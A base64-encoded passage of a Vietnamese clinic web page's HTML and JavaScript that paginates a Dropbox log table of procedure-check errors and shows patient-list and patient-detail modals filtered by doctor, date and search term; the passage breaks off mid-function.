ICAgcGFuZWwuc3R5bGUuZGlzcGxheSA9ICJub25lIjsNCiAgICB9DQogIH0NCn0pOw0KDQo8L3NjcmlwdD4NCjxzY3JpcHQ+DQovLyA9PT09PT0gUEjDgk4gVFJBTkcgQuG6ok5HIExPRyBUUk9ORyBQT1BVUCA9PT09PT0NCmxldCBEQl9MT0dTID0gW107ICAgICAgIC8vIHRvw6BuIGLhu5kgbG9ncyDEkcOjIHThuqNpDQpsZXQgREJfUEFHRSA9IDE7ICAgICAgICAvLyB0cmFuZyBoaeG7h24gdOG6oWkNCmxldCBEQl9QQUdFX1NJWkUgPSAxMDsgIC8vIHPhu5EgZMOybmcgLyB0cmFuZw0KbGV0IERCX0NVUlJFTlRfVVNFUiA9ICcnOyAvLyB1c2VyIMSRYW5nIMSRxINuZyBuaOG6rXAgKGxvd2VyY2FzZSkgxJHhu4MgcmVuZGVyIG7DunQgWG/DoQ0KDQpmdW5jdGlvbiBzZXRQYWdlU2l6ZShzaXplKXsNCiAgREJfUEFHRV9TSVpFID0gTnVtYmVyKHNpemUpIHx8IDEwOw0KICBEQl9QQUdFID0gMTsNCiAgcmVuZGVyRHJvcGJveFBhZ2UoKTsNCn0NCg0KZnVuY3Rpb24gZ29Ub1BhZ2UocCl7DQogIGNvbnN0IG1heCA9IE1hdGgubWF4KDEsIE1hdGguY2VpbChEQl9MT0dTLmxlbmd0aCAvIERCX1BBR0VfU0laRSkpOw0KICBEQl9QQUdFID0gTWF0aC5taW4oTWF0aC5tYXgoMSwgcCksIG1heCk7DQogIHJlbmRlckRyb3Bib3hQYWdlKCk7DQp9DQoNCmZ1bmN0aW9uIHJlbmRlckRyb3Bib3hQYWdlKCl7DQogIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hGaWxlTGlzdCcpOw0KICBjb25zdCBwYWdlQnRucyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94UGFnZUJ1dHRvbnMnKTsNCiAgY29uc3QgcGFnZUluZm8gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveFBhZ2VJbmZvJyk7DQoNCiAgaWYoIXRib2R5KSByZXR1cm47DQoNCiAgLy8gcuG7l25nPw0KICBpZighQXJyYXkuaXNBcnJheShEQl9MT0dTKSB8fCBEQl9MT0dTLmxlbmd0aCA9PT0gMCl7DQogICAgdGJvZHkuaW5uZXJIVE1MID0gYDx0cj48dGQgY29sc3Bhbj0iNiIgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyO2NvbG9yOnJlZCI+S2jDtG5nIGPDsyBkYW5oIHPDoWNoIG7DoG8gxJHGsOG7o2MgbMawdTwvdGQ+PC90cj5gOw0KICAgIGlmKHBhZ2VCdG5zKSBwYWdlQnRucy5pbm5lckhUTUwgPSAnJzsNCiAgICBpZihwYWdlSW5mbykgcGFnZUluZm8udGV4dENvbnRlbnQgPSAnJzsNCiAgICByZXR1cm47DQogIH0NCg0KICBjb25zdCB0b3RhbCA9IERCX0xPR1MubGVuZ3RoOw0KICBjb25zdCBtYXhQYWdlID0gTWF0aC5tYXgoMSwgTWF0aC5jZWlsKHRvdGFsIC8gREJfUEFHRV9TSVpFKSk7DQogIGlmKERCX1BBR0UgPiBtYXhQYWdlKSBEQl9QQUdFID0gbWF4UGFnZTsNCg0KICBjb25zdCBzdGFydElkeCA9IChEQl9QQUdFIC0gMSkgKiBEQl9QQUdFX1NJWkU7DQogIGNvbnN0IGVuZElkeCAgID0gTWF0aC5taW4oc3RhcnRJZHggKyBEQl9QQUdFX1NJWkUsIHRvdGFsKTsNCiAgY29uc3Qgc2xpY2UgICAgPSBEQl9MT0dTLnNsaWNlKHN0YXJ0SWR4LCBlbmRJZHgpOw0KDQogIC8vIFJlbmRlciBib2R5IHRoZW8gdHJhbmcNCiAgdGJvZHkuaW5uZXJIVE1MID0gc2xpY2UubWFwKChpdGVtLCBpKSA9PiBgDQogICAgPHRyPg0KICAgICAgPHRkPiR7c3RhcnRJZHggKyBpICsgMX08L3RkPg0KICAgICAgPHRkPiR7aXRlbS5raG9hIHx8ICcnfTwvdGQ+DQogICAgICA8dGQ+JHsoaXRlbS5uZ2F5IHx8ICcnKQ0KICAgICAgICAgICAucmVwbGFjZSgnMDA6MDA6MDAnLCcnKQ0KICAgICAgICAgICAucmVwbGFjZSgnMjM6NTk6NTknLCcnKQ0KICAgICAgICAgICAucmVwbGFjZSgnVOG7qycsJycpDQogICAgICAgICAgIC5yZXBsYWNlKCfEkeG6v24nLCcgLT4gJykNCiAgICAgICAgICAgLnJlcGxhY2UoL1xzKy9nLCcgJykNCiAgICAgICAgICAgLnRyaW0oKX08L3RkPg0KCQkgICANCgkJICAgPHRkPiR7TnVtYmVyKGl0ZW0uaGVyYl9lcnJvcnMgfHwgMCl9PC90ZD4NCiAgICAgPHRkPiR7TnVtYmVyKGl0ZW0udGltZV9lcnJvcnMgfHwgMCl9PC90ZD4NCiAgICA8dGQ+JHtOdW1iZXIoaXRlbS5jb25mbGljdF9lcnJvcnMgfHwgMCl9PC90ZD4NCgkJICAgDQogICAgICA8dGQ+JHsoaXRlbS50aW1lIHx8ICcnKQ0KICAgICAgICAgICAucmVwbGFjZSgnLCcsICcnKQ0KICAgICAgICAgICAucmVwbGFjZSgnICcsICcgLSAnKQ0KICAgICAgICAgICAucmVwbGFjZSgvXHMrL2csICcgJykNCiAgICAgICAgICAgLnRyaW0oKX08L3RkPg0KICAgICAgPHRkPjxhIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgb25jbGljaz0idmVyaWZ5QW5kT3BlbkxpbmsoJyR7aXRlbS5saW5rfScpIj5YZW08L2E+PC90ZD4NCiAgICAgIDx0ZD4NCiAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBzdHlsZT0iYmFja2dyb3VuZDojZTc0YzNjOyBwYWRkaW5nOjEwcHggMTRweDsgZm9udC1zaXplOjEycHg7Ig0KICAgICAgICAgIG9uY2xpY2s9Im9uRGVsZXRlTG9nUm93KCR7c3RhcnRJZHggKyBpfSwgJyR7REJfQ1VSUkVOVF9VU0VSfScpIj4NCiAgICAgICAgICA8aSBjbGFzcz0iZmEgZmEtdHJhc2giPjwvaT4gWG/DoQ0KICAgICAgICA8L2J1dHRvbj4NCiAgICAgIDwvdGQ+DQogICAgPC90cj4NCiAgYCkuam9pbignJyk7DQoNCiAgLy8gUmVuZGVyIG7DunQgdHJhbmcgKFByZXYg4oCmIE5leHQpIOKAlCBoaeG7g24gdGjhu4sgZOG6o2kgdOG7kWkgxJFhIDcgbsO6dCBz4buRDQogIGlmKHBhZ2VCdG5zKXsNCiAgICBjb25zdCBidG4gPSAobGFiZWwsIHRhcmdldCwgZGlzYWJsZWQ9ZmFsc2UsIHRpdGxlPScnKSA9Pg0KICAgICAgYDxidXR0b24gY2xhc3M9ImJ0biIgJHtkaXNhYmxlZD8nZGlzYWJsZWQnOicnfSB0aXRsZT0iJHt0aXRsZX0iDQogICAgICAgICAgICAgICBzdHlsZT0icGFkZGluZzo2cHggMTBweCR7ZGlzYWJsZWQ/JztvcGFjaXR5Oi42O2N1cnNvcjpub3QtYWxsb3dlZCc6Jyd9Ig0KICAgICAgICAgICAgICAgb25jbGljaz0iZ29Ub1BhZ2UoJHt0YXJnZXR9KSI+JHtsYWJlbH08L2J1dHRvbj5gOw0KDQogICAgY29uc3QgcmFuZ2UgPSAzOyAvLyBoYWkgYsOqbiB0cmFuZyBoaeG7h24gdOG6oWkNCiAgICBjb25zdCBmcm9tICA9IE1hdGgubWF4KDEsIERCX1BBR0UgLSByYW5nZSk7DQogICAgY29uc3QgdG8gICAgPSBNYXRoLm1pbihtYXhQYWdlLCBEQl9QQUdFICsgcmFuZ2UpOw0KDQogICAgbGV0IGh0bWwgPSAnJzsNCiAgICBodG1sICs9IGJ0bignwqsgxJDhuqd1JywgMSwgREJfUEFHRT09PTEsICdUcmFuZyDEkeG6p3UnKTsNCiAgICBodG1sICs9IGJ0bign4oC5IFRyxrDhu5tjJywgREJfUEFHRS0xLCBEQl9QQUdFPT09MSwgJ1RyYW5nIHRyxrDhu5tjJyk7DQogICAgZm9yKGxldCBwID0gZnJvbTsgcCA8PSB0bzsgcCsrKXsNCiAgICAgIGh0bWwgKz0gYDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0iZ29Ub1BhZ2UoJHtwfSkiDQogICAgICAgICAgICAgICAgIHN0eWxlPSJwYWRkaW5nOjZweCAxMHB4OyR7cD09PURCX1BBR0U/J2JhY2tncm91bmQ6IzJlY2M3MSc6Jyd9Ij4NCiAgICAgICAgICAgICAgICAgJHtwfQ0KICAgICAgICAgICAgICAgPC9idXR0b24+YDsNCiAgICB9DQogICAgaHRtbCArPSBidG4oJ1NhdSDigLonLCBEQl9QQUdFKzEsIERCX1BBR0U9PT1tYXhQYWdlLCAnVHJhbmcgc2F1Jyk7DQogICAgaHRtbCArPSBidG4oJ0N14buRaSDCuycsIG1heFBhZ2UsIERCX1BBR0U9PT1tYXhQYWdlLCAnVHJhbmcgY3Xhu5FpJyk7DQoNCiAgICBwYWdlQnRucy5pbm5lckhUTUwgPSBodG1sOw0KICB9DQoNCiAgaWYocGFnZUluZm8pew0KICAgIHBhZ2VJbmZvLnRleHRDb250ZW50ID0gYFRyYW5nICR7REJfUEFHRX0vJHttYXhQYWdlfSDigKIgJHtzdGFydElkeCsxfS0ke2VuZElkeH0vJHt0b3RhbH1gOw0KICB9DQp9DQoNCi8vIEfhuq9uIHPhu7Ega2nhu4duIMSR4buVaSBwYWdlIHNpemUgKGNo4buJIGPhuqduIGfhu41pIDEgbOG6p24gc2F1IGtoaSBwb3B1cCBt4bufKQ0KZnVuY3Rpb24gYXR0YWNoUGFnZXJFdmVudHNPbmNlKCl7DQogIGNvbnN0IHNlbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94UGFnZVNpemUnKTsNCiAgaWYoc2VsICYmICFzZWwuZGF0YXNldC5ib3VuZCl7DQogICAgc2VsLmRhdGFzZXQuYm91bmQgPSAnMSc7DQogICAgc2VsLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGUgPT4gc2V0UGFnZVNpemUoZS50YXJnZXQudmFsdWUpKTsNCiAgfQ0KfQ0KPC9zY3JpcHQ+DQo8IS0tRGFuaCBzw6FjaCB0aOG7pyB0aHXhuq10IHThu6tuZyBi4buHbmggbmjDom4tLT4NCjwhLS0gTW9kYWwgRGFuaCBzw6FjaCBi4buHbmggbmjDom4gLS0+DQo8ZGl2IGlkPSJwYXRpZW50TGlzdE1vZGFsIiBzdHlsZT0iZGlzcGxheTpub25lO3Bvc2l0aW9uOmZpeGVkO2luc2V0OjA7ei1pbmRleDoxMTA4MDsiPg0KICA8ZGl2IHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTtpbnNldDowO2JhY2tncm91bmQ6cmdiYSgwLDAsMCwwLjUpIiBvbmNsaWNrPSJjbG9zZVBhdGllbnRMaXN0KCkiPjwvZGl2Pg0KICA8ZGl2IGNsYXNzPSJtb2RhbC1iYXNlIG1vZGFsLWxhcmdlIj4NCiAgICA8ZGl2IHN0eWxlPSJkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuO3BhZGRpbmc6MTRweCAxNnB4O2JvcmRlci1ib3R0b206MXB4IHNvbGlkICNlNWU3ZWIiPg0KICAgICAgPGgzIHN0eWxlPSJtYXJnaW46MDtmb250LXNpemU6MThweCI+RGFuaCBzw6FjaCBi4buHbmggbmjDom48L2gzPg0KICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJjbG9zZVBhdGllbnRMaXN0KCkiPsSQw7NuZzwvYnV0dG9uPg0KICAgIDwvZGl2Pg0KICAgIA0KICAgIDwhLS0gQuG7mSBs4buNYyAtLT4NCiAgICA8ZGl2IGNsYXNzPSJmaWx0ZXItY29udGFpbmVyIiBzdHlsZT0icGFkZGluZzoxNnB4IDE2cHggMCAxNnB4OyI+DQogICAgICA8ZGl2Pg0KICAgICAgICA8bGFiZWwgZm9yPSJwYXRpZW50RG9jdG9yRmlsdGVyIj5Cw6FjIHPEqSBjaOG7iSDEkeG7i25oOjwvbGFiZWw+DQogICAgICAgIDxzZWxlY3QgaWQ9InBhdGllbnREb2N0b3JGaWx0ZXIiIGNsYXNzPSJsb2dpbi1pbnB1dCIgc3R5bGU9IndpZHRoOmF1dG87bWFyZ2luLWxlZnQ6MTBweDsiPg0KICAgICAgICAgIDxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPg0KICAgICAgICA8L3NlbGVjdD4NCiAgICAgIDwvZGl2Pg0KICAgICAgPGRpdj4NCiAgICAgICAgPGxhYmVsIGZvcj0icGF0aWVudFNlYXJjaCI+VMOsbSBraeG6v206PC9sYWJlbD4NCiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGlkPSJwYXRpZW50U2VhcmNoIiBwbGFjZWhvbGRlcj0iVMOqbiBCTiwgbcOjIEJOLCBtw6MgxJFp4buBdSB0cuG7iyIgDQogICAgICAgICAgICAgICBzdHlsZT0id2lkdGg6MjUwcHg7bWFyZ2luLWxlZnQ6MTBweDsiPg0KICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQogICAgDQogICAgPCEtLSBC4bqjbmcgZGFuaCBzw6FjaCBi4buHbmggbmjDom4gLS0+DQogICAgPGRpdiBzdHlsZT0icGFkZGluZzowIDE2cHggMTZweCAxNnB4OyI+DQogICAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIiBzdHlsZT0id2lkdGg6MTAwJSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICA8dHI+DQogICAgICAgICAgICA8dGg+TcOjIEJOPC90aD4NCiAgICAgICAgICAgIDx0aD5Uw6puIGLhu4duaCBuaMOibjwvdGg+DQogICAgICAgICAgICA8dGg+VHXhu5VpPC90aD4NCiAgICAgICAgICAgIDx0aD5Cw6FjIHPEqSBjaOG7iSDEkeG7i25oPC90aD4NCiAgICAgICAgICA8L3RyPg0KICAgICAgICA8L3RoZWFkPg0KICAgICAgICA8dGJvZHkgaWQ9InBhdGllbnRMaXN0Qm9keSI+PC90Ym9keT4NCiAgICAgIDwvdGFibGU+DQogICAgPC9kaXY+DQogIDwvZGl2Pg0KPC9kaXY+DQoNCjwhLS0gTW9kYWwgQ2hpIHRp4bq/dCBi4buHbmggbmjDom4gLS0+DQo8ZGl2IGlkPSJwYXRpZW50RGV0YWlsTW9kYWwiIHN0eWxlPSJkaXNwbGF5Om5vbmU7cG9zaXRpb246Zml4ZWQ7aW5zZXQ6MDt6LWluZGV4OjExMDkwOyI+DQogIDxkaXYgc3R5bGU9InBvc2l0aW9uOmFic29sdXRlO2luc2V0OjA7YmFja2dyb3VuZDpyZ2JhKDAsMCwwLDAuNSkiIG9uY2xpY2s9ImNsb3NlUGF0aWVudERldGFpbCgpIj48L2Rpdj4NCiAgPGRpdiBjbGFzcz0ibW9kYWwtYmFzZSBtb2RhbC1sYXJnZSI+DQogICAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtqdXN0aWZ5LWNvbnRlbnQ6c3BhY2UtYmV0d2VlbjtwYWRkaW5nOjE0cHggMTZweDtib3JkZXItYm90dG9tOjFweCBzb2xpZCAjZTVlN2ViIj4NCiAgICAgIDxoMyBzdHlsZT0ibWFyZ2luOjA7Zm9udC1zaXplOjE4cHgiIGlkPSJwYXRpZW50RGV0YWlsVGl0bGUiPkNoaSB0aeG6v3QgYuG7h25oIG5ow6JuPC9oMz4NCiAgICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0iY2xvc2VQYXRpZW50RGV0YWlsKCkiPsSQw7NuZzwvYnV0dG9uPg0KICAgIDwvZGl2Pg0KICAgIA0KICAgIDwhLS0gQuG7mSBs4buNYyBuZ8OgeSAtLT4NCiAgICA8ZGl2IGNsYXNzPSJmaWx0ZXItY29udGFpbmVyIiBzdHlsZT0icGFkZGluZzoxNnB4IDE2cHggMCAxNnB4OyI+DQogICAgICA8ZGl2Pg0KICAgICAgICA8bGFiZWwgZm9yPSJwYXRpZW50RGF0ZUZpbHRlciI+TOG7jWMgdGhlbyBuZ8OgeTo8L2xhYmVsPg0KICAgICAgICA8c2VsZWN0IGlkPSJwYXRpZW50RGF0ZUZpbHRlciIgY2xhc3M9ImxvZ2luLWlucHV0IiBzdHlsZT0id2lkdGg6YXV0bzttYXJnaW4tbGVmdDoxMHB4OyI+DQogICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjIG5nw6B5PC9vcHRpb24+DQogICAgICAgIDwvc2VsZWN0Pg0KICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQogICAgDQogICAgPCEtLSBC4bqjbmcgY2hpIHRp4bq/dCB0aOG7pyB0aHXhuq10IC0tPg0KICAgIDxkaXYgc3R5bGU9InBhZGRpbmc6MCAxNnB4IDE2cHggMTZweDsiPg0KICAgICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSIgc3R5bGU9IndpZHRoOjEwMCUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgPHRyPg0KICAgICAgICAgICAgPHRoPlRo4bunIHRodeG6rXQ8L3RoPg0KICAgICAgICAgICAgPHRoPjxjZW50ZXI+VGjhu51pIGdpYW48L2NlbnRlcj48L3RoPg0KICAgICAgICAgICAgPHRoIGNsYXNzPSJkb2N0b3ItY29sdW1uIj5Cw6FjIHPEqSBjaOG7iSDEkeG7i25oPC90aD4NCiAgICAgICAgICAgIDx0aD5OZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICA8L3RyPg0KICAgICAgICA8L3RoZWFkPg0KICAgICAgICA8dGJvZHkgaWQ9InBhdGllbnREZXRhaWxCb2R5Ij48L3Rib2R5Pg0KICAgICAgPC90YWJsZT4NCiAgICA8L2Rpdj4NCiAgPC9kaXY+DQo8L2Rpdj4NCjxzY3JpcHQ+DQovLyBCaeG6v24gbMawdSB0cuG7ryBk4buvIGxp4buHdSBi4buHbmggbmjDom4NCmxldCBwYXRpZW50TGlzdERhdGEgPSBbXTsNCg0KLy8gTeG7nyBtb2RhbCBkYW5oIHPDoWNoIGLhu4duaCBuaMOibg0KZnVuY3Rpb24gb3BlblBhdGllbnRMaXN0KCkgew0KICAgIGlmICghYWxsUHJvY2VkdXJlcyB8fCBhbGxQcm9jZWR1cmVzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBhbGVydCgnVnVpIGzDsm5nIGtp4buDbSB0cmEgZmlsZSB0csaw4bubYyBraGkgeGVtIGRhbmggc8OhY2ggYuG7h25oIG5ow6JuLicpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIC8vIFjhu60gbMO9IGThu68gbGnhu4d1IGLhu4duaCBuaMOibg0KICAgIHByb2Nlc3NQYXRpZW50RGF0YSgpOw0KICAgIA0KICAgIC8vIEhp4buDbiB0aOG7iyBtb2RhbA0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRpZW50TGlzdE1vZGFsJykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQp9DQoNCi8vIMSQw7NuZyBtb2RhbCBkYW5oIHPDoWNoIGLhu4duaCBuaMOibg0KZnVuY3Rpb24gY2xvc2VQYXRpZW50TGlzdCgpIHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGF0aWVudExpc3RNb2RhbCcpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQp9DQoNCi8vIFjhu60gbMO9IGThu68gbGnhu4d1IGLhu4duaCBuaMOibg0KZnVuY3Rpb24gcHJvY2Vzc1BhdGllbnREYXRhKCkgew0KICAgIGNvbnN0IHBhdGllbnRNYXAgPSBuZXcgTWFwKCk7DQogICAgDQogICAgLy8gR29tIG5ow7NtIGThu68gbGnhu4d1IHRoZW8gYuG7h25oIG5ow6JuIChraMO0bmcgcGjDom4gYmnhu4d0IMSR4bujdCDEkWnhu4F1IHRy4buLKQ0KICAgIGFsbFByb2NlZHVyZXMuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgY29uc3QgcGF0aWVudElkID0gcHJvYy5wYXRpZW50SWQgfHwgJ0tow7RuZyBjw7MnOw0KICAgICAgICBjb25zdCBwYXRpZW50TmFtZSA9IHByb2MucGF0aWVudE5hbWUgfHwgJ0tow7RuZyBjw7MnOw0KICAgICAgICBjb25zdCBwYXRpZW50QWdlID0gcHJvYy5wYXRpZW50QWdlIHx8ICdLaMO0bmcgY8OzJzsNCiAgICAgICAgY29uc3QgZG9jdG9yID0gcHJvYy5kb2N0b3IgfHwgJ0tow7RuZyBjw7MnOw0KICAgICAgICANCiAgICAgICAgLy8gVOG6oW8ga2V5IGR1eSBuaOG6pXQgY2hvIGLhu4duaCBuaMOibiAoY2jhu4kgZMO5bmcgbcOjIEJOIHbDoCB0w6puKQ0KICAgICAgICBjb25zdCBwYXRpZW50S2V5ID0gYCR7cGF0aWVudElkfV8ke3BhdGllbnROYW1lfWA7DQogICAgICAgIA0KICAgICAgICBpZiAoIXBhdGllbnRNYXAuaGFzKHBhdGllbnRLZXkpKSB7DQogICAgICAgICAgICBwYXRpZW50TWFwLnNldChwYXRpZW50S2V5LCB7DQogICAgICAgICAgICAgICAgcGF0aWVudElkLA0KICAgICAgICAgICAgICAgIHBhdGllbnROYW1lLA0KICAgICAgICAgICAgICAgIHBhdGllbnRBZ2UsDQogICAgICAgICAgICAgICAgZG9jdG9yLA0KICAgICAgICAgICAgICAgIHByb2NlZHVyZXM6IFtwcm9jXSAvLyBMxrB1IHThuqV0IGPhuqMgdGjhu6cgdGh14bqtdCBj4bunYSBi4buHbmggbmjDom4NCiAgICAgICAgICAgIH0pOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgLy8gVGjDqm0gdGjhu6cgdGh14bqtdCB2w6BvIGLhu4duaCBuaMOibiDEkcOjIHThu5NuIHThuqFpDQogICAgICAgICAgICBjb25zdCBwYXRpZW50ID0gcGF0aWVudE1hcC5nZXQocGF0aWVudEtleSk7DQogICAgICAgICAgICBwYXRpZW50LnByb2NlZHVyZXMucHVzaChwcm9jKTsNCiAgICAgICAgfQ0KICAgIH0pOw0KICAgIA0KICAgIC8vIENodXnhu4NuIE1hcCB0aMOgbmggbeG6o25nDQogICAgcGF0aWVudExpc3REYXRhID0gQXJyYXkuZnJvbShwYXRpZW50TWFwLnZhbHVlcygpKTsNCiAgICANCiAgICAvLyBIaeG7g24gdGjhu4sgZGFuaCBzw6FjaA0KICAgIHJlbmRlclBhdGllbnRMaXN0KCk7DQogICAgDQogICAgLy8gQ+G6rXAgbmjhuq10IGLhu5kgbOG7jWMgYsOhYyBzxKkNCiAgICB1cGRhdGVQYXRpZW50RG9jdG9yRmlsdGVyKCk7DQp9DQoNCi8vIEhp4buDbiB0aOG7iyBkYW5oIHPDoWNoIGLhu4duaCBuaMOibg0KZnVuY3Rpb24gcmVuZGVyUGF0aWVudExpc3QoKSB7DQogICAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGF0aWVudExpc3RCb2R5Jyk7DQogICAgY29uc3QgZG9jdG9yRmlsdGVyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhdGllbnREb2N0b3JGaWx0ZXInKS52YWx1ZTsNCiAgICBjb25zdCBzZWFyY2hUZXJtID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhdGllbnRTZWFyY2gnKS52YWx1ZS50b0xvd2VyQ2FzZSgpOw0KICAgIA0KICAgIC8vIEzhu41jIGThu68gbGnhu4d1DQogICAgbGV0IGZpbHRlcmVkRGF0YSA9IHBhdGllbnRMaXN0RGF0YTsNCiAgICANCiAgICBpZiAoZG9jdG9yRmlsdGVyICE9PSAnYWxsJykgew0KICAgICAgICBmaWx0ZXJlZERhdGEgPSBmaWx0ZXJlZERhdGEuZmlsdGVyKHAgPT4gcC5kb2N0b3IgPT09IGRvY3RvckZpbHRlcik7DQogICAgfQ0KICAgIA0KICAgIGlmIChzZWFyY2hUZXJtKSB7DQogICAgICAgIGZpbHRlcmVkRGF0YSA9IGZpbHRlcmVkRGF0YS5maWx0ZXIocCA9PiANCiAgICAgICAgICAgIHAucGF0aWVudE5hbWUudG9Mb3dlckNhc2UoKS5pbmNsdWRlcyhzZWFyY2hUZXJtKSB8fA0KICAgICAgICAgICAgcC5wYXRpZW50SWQudG9Mb3dlckNhc2UoKS5pbmNsdWRlcyhzZWFyY2hUZXJtKQ0KICAgICAgICApOw0KICAgIH0NCiAgICANCiAgICAvLyBIaeG7g24gdGjhu4sNCiAgICB0Ym9keS5pbm5lckhUTUwgPSAnJzsNCiAgICANCiAgICBpZiAoZmlsdGVyZWREYXRhLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICB0Ym9keS5pbm5lckhUTUwgPSAnPHRyPjx0ZCBjb2xzcGFuPSI0IiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXIiPktow7RuZyB0w6xtIHRo4bqleSBi4buHbmggbmjDom4gbsOgbzwvdGQ+PC90cj4nOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIGZpbHRlcmVkRGF0YS5mb3JFYWNoKHBhdGllbnQgPT4gew0KICAgICAgICBjb25zdCByb3cgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgICAgICByb3cuY2xhc3NOYW1lID0gJ3BhdGllbnQtcm93JzsNCiAgICAgICAgcm93Lm9uY2xpY2sgPSAoKSA9PiBvcGVuUGF0aWVudERldGFpbChwYXRpZW50KTsNCiAgICAgICAgcm93LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgIDx0ZD4ke3BhdGllbnQucGF0aWVudElkfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtwYXRpZW50LnBhdGllbnROYW1lfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtwYXRpZW50LnBhdGllbnRBZ2V9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke3BhdGllbnQuZG9jdG9yfTwvdGQ+DQogICAgICAgIGA7DQogICAgICAgIHRib2R5LmFwcGVuZENoaWxkKHJvdyk7DQogICAgfSk7DQp9DQoNCi8vIEPhuq1wIG5o4bqtdCBi4buZIGzhu41jIGLDoWMgc8SpDQpmdW5jdGlvbiB1cGRhdGVQYXRpZW50RG9jdG9yRmlsdGVyKCkgew0KICAgIGNvbnN0IGRvY3RvcnMgPSBbLi4ubmV3IFNldChwYXRpZW50TGlzdERhdGEubWFwKHAgPT4gcC5kb2N0b3IpKV0uc29ydCgpOw0KICAgIGNvbnN0IHNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRpZW50RG9jdG9yRmlsdGVyJyk7DQogICAgDQogICAgc2VsZWN0LmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsNCiAgICAgICAgZG9jdG9ycy5tYXAoZCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KfQ0KDQovLyBCaeG6v24gbMawdSB0cuG7ryBi4buHbmggbmjDom4gxJFhbmcgxJHGsOG7o2MgeGVtDQpsZXQgY3VycmVudFBhdGllbnQgPSBudWxsOw0KDQovLyBN4bufIG1vZGFsIGNoaSB0aeG6v3QgYuG7h25oIG5ow6JuDQpmdW5jdGlvbiBvcGVuUGF0aWVudERldGFpbChwYXRpZW50KSB7DQogICAgY3VycmVudFBhdGllbnQgPSBwYXRpZW50Ow0KICAgIA0KICAgIC8vIMSQ4bq3dCB0acOqdSDEkeG7gQ0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRpZW50RGV0YWlsVGl0bGUnKS50ZXh0Q29udGVudCA9IA0KICAgICAgICBgQ2hpIHRp4bq/dCBi4buHbmggbmjDom46ICR7cGF0aWVudC5wYXRpZW50TmFtZX0gKCR7cGF0aWVudC5wYXRpZW50SWR9KWA7DQogICAgDQogICAgLy8gQ+G6rXAgbmjhuq10IGLhu5kgbOG7jWMgbmfDoHkNCiAgICB1cGRhdGVQYXRpZW50RGF0ZUZpbHRlcihwYXRpZW50LnByb2NlZHVyZXMpOw0KICAgIA0KICAgIC8vIEhp4buDbiB0aOG7iyBjaGkgdGnhur90ICh04bqldCBj4bqjIHRo4bunIHRodeG6rXQgYmFuIMSR4bqndSkNCiAgICByZW5kZXJQYXRpZW50RGV0YWlsKHBhdGllbnQucHJvY2VkdXJlcyk7DQogICAgDQogICAgLy8gSGnhu4NuIHRo4buLIG1vZGFsDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhdGllbnREZXRhaWxNb2RhbCcpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KfQ0KDQovLyDEkMOzbmcgbW9kYWwgY2hpIHRp4bq/dCBi4buHbmggbmjDom4NCmZ1bmN0aW9uIGNsb3NlUGF0aWVudERldGFpbCgpIHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGF0aWVudERldGFpbE1vZGFsJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICBjdXJyZW50UGF0aWVud